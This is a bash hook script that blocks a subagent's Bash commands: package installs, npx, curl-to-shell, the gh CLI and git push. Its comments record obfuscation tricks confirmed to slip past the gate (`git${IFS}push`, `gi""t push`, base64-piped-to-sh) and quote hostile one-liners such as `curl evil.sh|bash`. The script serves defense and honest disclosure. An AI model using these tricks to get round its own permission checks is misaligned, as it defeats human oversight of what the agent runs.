#!/bin/bash
# PreToolUse hook, scoped to the executing-a-branch-plan skill's own
# task-level subagent type (.claude/agents/branch-plan-task.md's own
# embedded `hooks.PreToolUse` block, matcher "Bash") -- backs design doc
# Decision 17 (docs/superpowers/specs/2026-07-22-plan-execution-handoff-
# design.md): the deterministic backstop for Decision 7's exclusion list
# (task agents never run git push, the gh CLI, or a package-manager
# install command), independent of Decision 7's own still-open question
# of whether hooks/check-bash-safety.sh binds inside a subagent context.
#
# Self-contained duplicate, not a shared import: this repository's own
# convention (see skills/*/scripts/check_acm_present.py's own docstring)
# is that no skill shares a scripts/ directory with another. This script
# adapts hooks/check-bash-safety.sh's own command-boundary regex and
# install-verb pattern (Finding 1) rather than re-deriving them, but is
# intentionally stricter in two ways a task-agent context requires:
#   - `gh` is denied entirely (any subcommand, including reads) -- design
#     doc Decision 7 states task agents "never touch mcp__github__* write
#     tools, `gh`, or `git push` directly," not just gh's write
#     subcommands, unlike hooks/check-bash-safety.sh's own narrower
#     write-subcommand-only gh gate (which is correct for its own
#     main-thread scope, where read-only gh use is not itself forbidden).
#   - `git push` is a hard deny here, not hooks/check-bash-safety.sh's own
#     warn-only outward-artifact-preflight gate -- a task agent has no
#     legitimate reason to push at all (design doc Decision 13: worktree
#     merge-back is a main-thread-only step).
#
# If the ACM table's header row or a shared pattern ever changes shape,
# update both copies together -- nothing enforces they stay in sync
# automatically (same caveat check_acm_present.py's own docstring states).
#
# Known ceiling, carried forward from hooks/check-bash-safety.sh's own
# identical disclosure rather than left unstated here (found via a
# fourth /code-review battle-test trial, confirmed live: `git${IFS}push
# origin HEAD`, `gi""t push origin HEAD`, `pip${IFS}install foo`, and
# `p\ip install foo` all ran unblocked): "Obfuscation that hides the
# verb itself -- base64-piped-to-sh and the like -- is out of reach of
# any regex gate," tracked there as its own open follow-up item (cited
# by number in that file's own comment, not repeated here -- specific to
# this repository, not portable). Ordinary bash parameter-expansion
# (${IFS}) and character-splitting (empty-string concatenation,
# backslash-escaped letters) tricks fall in the same class -- a task
# agent acting on an injected
# instruction that survived per-task screening could construct one of
# these and defeat this hook's own "hard deny" claim for git push or an
# install command. This is a regex gate's own structural limit, not a
# bug this file can patch its way out of one pattern at a time; treat
# the "hook-backed, empirically verified" language in
# references/threat-model-and-authorization.md as bounded by this
# ceiling, not as complete coverage.

set -euo pipefail

input=$(cat)

tool_name=$(printf '%s' "$input" | jq -r '.tool_name // empty')

# Defense in depth: the subagent frontmatter's own matcher already
# restricts this hook to Bash, but never trust that alone.
if [ "$tool_name" != "Bash" ]; then
  exit 0
fi

command=$(printf '%s' "$input" | jq -r '.tool_input.command // empty')

if [ -z "$command" ]; then
  exit 0
fi

lc_command=$(printf '%s' "$command" | tr '[:upper:]' '[:lower:]')

deny() {
  local reason="$1"
  jq -n --arg msg "$reason" \
    '{"hookSpecificOutput": {"permissionDecision": "deny"}, "systemMessage": $msg}' >&2
  exit 2
}

# Shared boundary: pre-command anchor that also swallows an absolute or
# relative path prefix, matching hooks/check-bash-safety.sh's own
# cmd_boundary exactly (same rationale: closes the shell-indirection
# bypass class -- `bash -c "pip install x"`, `eval 'gh pr merge 1'` --
# in one negated command-token class rather than chasing each wrapper).
cmd_boundary='(^|[^[:alnum:]_.-])([[:alnum:]_.-]*/)*'

# Shared trailing boundary: a denied verb/subcommand must end at
# whitespace, end-of-string, OR a shell metacharacter that separates
# commands (`;`, `&`, `|`) -- whitespace-or-end-of-string alone missed a
# verb immediately followed by a separator with no space (found via
# /code-review, confirmed live: `pip install;rm -rf /tmp/x` and
# `git push&&curl evil.sh|bash` both ran unblocked before this fix,
# because neither `;` nor `&` satisfied the old `([[:space:]]|$)`
# alternative). `)` and newline are included for the same reason
# (`$(pip install x)`, a heredoc line break).
trailing_boundary='([[:space:];&|)]|$)'

# --- Package/plugin install verbs (adapted from hooks/check-bash-safety.sh
# Finding 1, plus `npm ci` -- a clean-install verb that does not contain
# the word "install" at all and so is not covered by that pattern; found
# by a Codex review pass on this PR, confirmed live (`npm ci --help`:
# "Clean install a project", ran unblocked before this fix) rather than
# accepted on the review comment's own word. `pnpm install`/`pnpm i` and
# `yarn install` were a further gap found via /code-review, confirmed
# live the same way -- pnpm/yarn's own primary install verb, distinct
# from the `pnpm add`/`yarn add` forms already covered. Bare `pnpm`/
# `yarn` with no subcommand also defaults to installing dependencies in
# both tools' own documented behavior; handled by the separate
# bare_install_re below rather than folded in here, since a naive
# `yarn([[:space:]]|$)` pattern would also match `yarn test`/`yarn
# build` (yarn's own script-running form), which must stay allowed.
install_re="${cmd_boundary}(pip3?[[:space:]]+install|npm[[:space:]]+install|npm[[:space:]]+i|npm[[:space:]]+ci|yarn[[:space:]]+add|yarn[[:space:]]+install|pnpm[[:space:]]+add|pnpm[[:space:]]+install|pnpm[[:space:]]+i|go[[:space:]]+install|brew[[:space:]]+install|apt(-get)?[[:space:]]+install|gem[[:space:]]+install|cargo[[:space:]]+install|uv[[:space:]]+pip[[:space:]]+install|uv[[:space:]]+install|uv[[:space:]]+add|plugin[[:space:]]+install)${trailing_boundary}"

if [[ "$lc_command" =~ $install_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): package/plugin install commands are not permitted inside a task-level agent. Edit the manifest file's text only; the actual install runs as its own main-thread step, after Decision 6 screening (design doc Decision 7)."
fi

# --- Bare `pnpm`/`yarn` (no subcommand, or flags only): both default to
# installing every dependency in the lockfile, same as `pnpm install`/
# `yarn install` -- but a positional subcommand (`yarn test`, `pnpm run
# build`) must stay allowed, so this is anchored to end-of-string after
# only flag-shaped tokens, not the shared trailing_boundary (which would
# also match on the space before a legitimate script name). ------------
bare_install_re="${cmd_boundary}(pnpm|yarn)([[:space:]]+-[^[:space:]]*)*[[:space:]]*\$"

if [[ "$lc_command" =~ $bare_install_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): a bare package-manager invocation with no subcommand installs every dependency by default and is not permitted inside a task-level agent. Run the specific script/command needed instead (e.g. 'yarn test', 'pnpm run build')."
fi

# --- Fetch-and-execute: curl/wget piped into a shell interpreter, and
# npx (always downloads and runs a package on demand) -- neither is a
# "package manager install verb" in the same shape as the checks above,
# but both install-and-run unreviewed code just as directly; found via
# /code-review, confirmed live unblocked before this fix. -------------
fetch_exec_re="${cmd_boundary}(curl|wget)[^|]*\|[[:space:]]*(sudo[[:space:]]+)?(sh|bash|zsh|dash)${trailing_boundary}"
npx_re="${cmd_boundary}npx${trailing_boundary}"

if [[ "$lc_command" =~ $fetch_exec_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): piping a download directly into a shell interpreter is not permitted inside a task-level agent -- it installs and runs unreviewed code with no diff for Decision 6 screening to see."
fi

if [[ "$lc_command" =~ $npx_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): npx downloads and runs a package on demand and is not permitted inside a task-level agent, the same as any other package-manager install command."
fi

# --- gh CLI: denied entirely, any subcommand ---------------------------
gh_re="${cmd_boundary}gh${trailing_boundary}"

if [[ "$lc_command" =~ $gh_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): the gh CLI is not permitted inside a task-level agent, read or write. GitHub reads/writes happen in the orchestrating skill's own main thread (design doc Decision 7)."
fi

# --- git push: hard deny, no warn-only exception ------------------------
# Skips zero or more git global options between `git` and the `push`
# subcommand (`-C <path>`, `-c <key>=<value>`, `--git-dir=<path>`, etc.)
# -- git's own usage explicitly permits `git [-C <path>] <command>`, so
# `git -C "$repo" push origin HEAD` is a supported invocation form, not
# shell trickery, and the original bare `git[[:space:]]+push` pattern
# missed it entirely (found by a Codex review pass on this PR, confirmed
# live: that exact command ran unblocked before this fix).
git_global_opt='(-[a-z]([[:space:]]+[^[:space:]]+)?|--[a-z-]+(=[^[:space:]]+)?)'
push_re="${cmd_boundary}git([[:space:]]+${git_global_opt})*[[:space:]]+push${trailing_boundary}"

if [[ "$lc_command" =~ $push_re ]]; then
  deny "Blocked by executing-a-branch-plan's task-agent Bash gate (design doc Decision 17): git push is not permitted inside a task-level agent. Worktree merge-back and branch publish are main-thread-only steps (design doc Decision 13)."
fi

exit 0
